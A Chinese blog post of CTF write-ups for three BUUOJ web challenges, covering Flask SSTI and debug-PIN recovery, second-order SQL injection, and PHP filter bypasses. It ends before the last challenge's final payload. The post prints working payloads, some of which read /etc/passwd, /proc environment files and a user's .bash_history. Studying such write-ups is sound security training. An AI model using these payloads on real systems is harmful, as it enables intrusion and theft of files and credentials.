<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>BUUOJ-web刷题（一）</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&title=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&title=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/&text=BUUOJ-web刷题（一）" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（一）&body=Check out this article: http://yoursite.com/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-CISCN2019-华东南赛区-Double-Secret"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [CISCN2019 华东南赛区]Double Secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-网鼎杯-2018-Comment"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [网鼎杯 2018]Comment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-BJDCTF2020-EzPHP"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [BJDCTF2020]EzPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-网鼎杯2018-Unfinish"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-Black-Watch-入群题-Web"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [Black Watch 入群题]Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-virink-2019-files-share"><span class="toc-number">6.</span> <span class="toc-text">0x 06 virink_2019_files_share</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BUUOJ-web刷题（一）
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-18T13:54:30.000Z" itemprop="datePublished">2020-03-18</time>
        
        (Updated: <time datetime="2020-03-18T13:56:10.303Z" itemprop="dateModified">2020-03-18</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/BUUOJ/" rel="tag">BUUOJ</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x-01-CISCN2019-华东南赛区-Double-Secret"><a href="#0x-01-CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="0x 01 [CISCN2019 华东南赛区]Double Secret"></a>0x 01 [CISCN2019 华东南赛区]Double Secret</h3><ul>
<li>考点</li>
</ul>
<p>ssti、Flask debug pin安全问题                </p>
<ul>
<li>解题过程</li>
</ul>
<p>超过四位的字符加密会报错, 报错信息中可以看到部分源码</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222846945.png" alt></p>
<p>将要加密的东西换成%ff, 又爆出了源码</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212222934076.png" alt></p>
<p>解法一：</p>
<p>ssti读取flag文件</p>
<p>利用工具CyberChef或者使用脚本加密</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225621819.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key &#x3D; key</span><br><span class="line">        self.key_length &#x3D; len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"></span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box &#x3D; [i for i in range(256)]</span><br><span class="line">        k &#x3D; [self.key[i % self.key_length] for i in range(256)]</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        for i in range(256):</span><br><span class="line">            j &#x3D; (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        j &#x3D; 0</span><br><span class="line">        result &#x3D; &#39;&#39;</span><br><span class="line">        for ch in plaintext:</span><br><span class="line">            i &#x3D; (i + 1) % 256</span><br><span class="line">            j &#x3D; (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] &#x3D; self.Box[j], self.Box[i]</span><br><span class="line">            t &#x3D; (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result +&#x3D; chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">a &#x3D; RC4(&#39;HereIsTreasure&#39;)</span><br><span class="line">cmd &#x3D; &quot;&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#39;&#x2F;flag.txt&#39;).read() &#125;&#125;&quot;</span><br><span class="line">payload &#x3D; urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res &#x3D; requests.get(url + payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>解法二：</p>
<p>Flask debug pin安全问题执行shell</p>
<p>参考：<a href="https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg</a></p>
<ul>
<li>生成pin码必要文件：<ul>
<li>username #用户名，可以查看/etc/passwd或者读取/proc/self/environ环境变量</li>
<li>modename #flask.app</li>
<li>getattr(app,’<strong>name</strong>‘,getattr(app.<strong>class</strong>,’<strong>name</strong>‘)) # Flask</li>
<li>getattr(mod,’<strong>file</strong>‘,None) #app.py的绝对路径</li>
<li>uuid.getnode() #mac地址十进制</li>
<li>get_machine_id() #docker环境下读取/proc/self/cgroup 其余依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件</li>
</ul>
</li>
</ul>
<p>依次需要获取6个变量，首先是用户名，我采用的办法是读取/proc/self/environ环境变量的办法，加密生成读取文件的payload：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225842982.png" alt></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212225820453.png" alt>可见username的值为glzjin</p>
<p>然后是modname，依然为flask.app</p>
<p>第三个值<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>依然为Flask</p>
<p>第四个值<code>getattr(mod, &quot;__file__&quot;, None)</code>要注意，服务器上python2的安装路径和我们本地的可不太一样，这可以从报错猜测这个值应该为<code>/usr/local/lib/python2.7/site-packages/flask/app.pyc</code></p>
<p>随后是str(uuid.getnode())的值，读取服务器的/sys/class/net/eth0/address文件，其结果为：<code>02:42:ae:00:9e:fc</code>,写一个脚本转换为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#-*-coding:utf8-*-</span><br><span class="line">machex &#x3D; &quot;0x&quot;+&quot;02:42:ae:00:9e:fc&quot;.replace(&#39;:&#39;,&#39;&#39;)</span><br><span class="line">print int(machex,16)</span><br><span class="line">### output</span><br><span class="line">2485410373372</span><br></pre></td></tr></table></figure>

<p>首先尝试打开/proc/self/cgroup文件，读取第一行，并将/docker/字符串后面的内容作为该函数的返回值，如果该文件不存在或者该值不存在，才会走入师傅们文章中提到的依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件的流程</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230454251.png" alt></p>
<p>那么它的get_machine_id()的返回值就应该是第一行/docker/后面的那部分，即</p>
<p>a8832ad13feb717ec6ae4c2f4a79b79b64c63329bd5497b7ab3f1b055860e5b8</p>
<p>至此，所有参数获取完毕，输入payload计算pin码：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230746497.png" alt></p>
<p>在报错页面中输入pin码，成功打开python shell,剩下就是读取flag了</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200212230827937.png" alt></p>
<p>参考资料：</p>
<blockquote>
<p> 从一道ctf题谈谈flask开启debug模式存在的安全问题 </p>
<p><a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p>
<p><a href="https://eustiar.com/archives/576" target="_blank" rel="noopener">https://eustiar.com/archives/576</a></p>
<p><a href="https://ch4ser-go.github.io/2019/05/27/SSTI/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/05/27/SSTI/</a></p>
</blockquote>
<h3 id="0x-02-网鼎杯-2018-Comment"><a href="#0x-02-网鼎杯-2018-Comment" class="headerlink" title="0x 02 [网鼎杯 2018]Comment"></a>0x 02 [网鼎杯 2018]Comment</h3><ul>
<li>考点</li>
</ul>
<p>git泄露、SQL二次注入</p>
<ul>
<li>解题过程</li>
</ul>
<ol>
<li>控制台提示存在git泄露，使用GitHack泄露代码得到</li>
</ol>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213104847569.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后发现可以构成二次注入,思路是这样的:</p>
<p>观察了一下发现是两张表 board 、comment</p>
<p>首先写评论的时候数据写到board  然后再次评论的时候  category这个变量会从 board<br> 表中读取然后构成二次注入</p>
<p>如下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180830132920-a53543fe-ac15-1.png" alt="img"></p>
<p> 发帖后302到登录页面，爆破得知密码是zhangwei666</p>
<p>登录以后，进行发帖。开始构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p>这里是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105247233.png" alt></p>
<p>然后再在评论里 */#</p>
<p>则拼接后的sql语句就是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;123&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">                content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p>这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*&#39;,</span><br><span class="line">       content &#x3D; &#39;*&#x2F;#&#39;,</span><br></pre></td></tr></table></figure>

<p>被注释了，语句仍然是正常的sql语句。</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105426900.png" alt></p>
<p>看history文件</p>
<p>首先常规的读文件payload:123’,content=(select( load_file(‘/etc/passwd’))),/*</p>
<p>看到www用户的目录：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213105627505.png" alt></p>
<p>发现一个www用户,看看用户的命令记录</p>
<p><code>123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213120311956.png" alt></p>
<blockquote>
<p>先在/tmp目录下解压压缩包</p>
<p>然后删除压缩包</p>
<p>再将html目录复制到/var/www/目录下</p>
<p>切换到/var/www/html，然后删除.DS_Store</p>
<p>但是并没有删除/tmp/html 目录下的，所以我们可以读取此文件~~</p>
</blockquote>
<p> 在/tmp/html下有个.DS_Store文件，用hex编码显示</p>
<p>payload: ‘, content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</p>
<p>解密一下</p>
<p><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1711.html</a></p>
<p>发现文件名<code>flag_8946e1ff1ee3e40f.php</code><br> payload：<code>123&#39;, content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20200213121254435.png" alt></p>
<blockquote>
<p>参考资料</p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104216070" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104216070</a></p>
<p><a href="https://xz.aliyun.com/t/2667#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2667#toc-1</a></p>
<p><a href="https://www.cnblogs.com/Tkitn/p/11649255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Tkitn/p/11649255.html</a></p>
</blockquote>
<h3 id="0x-03-BJDCTF2020-EzPHP"><a href="#0x-03-BJDCTF2020-EzPHP" class="headerlink" title="0x 03 [BJDCTF2020]EzPHP"></a>0x 03 [BJDCTF2020]EzPHP</h3><p>主页源代码处发现<code>GFXEIM3YFZYGQ4A=</code>，base32解密后得到1nD3x.php，访问得到源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>考点一：绕过QUERY_STRING的正则匹配</li>
</ul>
<p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行URLDecode，而<code>$_GET[]</code>会，所以只要进行url编码即可绕过</p>
<ul>
<li><p>考点二：绕过debu的正则匹配</p>
<p>可以使用<code>%0a</code>换行污染绕过</p>
</li>
<li><p>考点三：绕过$_REQUEST的字母匹配</p>
</li>
</ul>
<p><code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值，因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过</p>
<ul>
<li>考点4：绕过文件内容读取的比较</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;data:text&#x2F;plain,debu_debu_aqua</span><br></pre></td></tr></table></figure>

<ul>
<li><p>考点5：绕过sha1比较</p>
<p>数组绕过即可</p>
</li>
<li><p>考点6：create_function()代码注入</p>
</li>
<li><p>考点7：获得flag</p>
</li>
</ul>
<p>综上payload</p>
